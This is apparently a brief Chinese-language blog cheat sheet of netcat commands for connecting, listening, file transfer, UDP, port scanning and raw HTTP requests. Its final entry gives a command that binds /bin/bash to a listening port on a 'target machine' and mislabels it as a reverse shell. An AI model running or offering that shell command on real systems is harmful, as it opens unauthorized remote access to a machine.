---
layout: post
title:  "quick commands"
category: tools
date:   2024-02-03
---

记录一些常用的命令

## nc

### 1 建立TCP连接

`nc hostname port`

### 2 监听TCP端口

`nc -l -p port`

监听UDP的命令是`nc -u -l -p port`

### 3 发送文件

`nc -w 3 hostname port < file`

### 4 接收文件

`nc -l -p port > file`

### 5 发送UDP数据

`echo "data" | nc -u -w 1 hostname port`

### 6 扫描开放的端口

`nc -zv hostname start_port-end_port`

### 7 通过HTTP请求发送数据

`echo -e "GET / HTTP/1.1\nHost: hostname\n\n" | nc hostname port`

### 8 创建反向shell： 在目标机器上运行

`nc -l -p port -e /bin/bash`
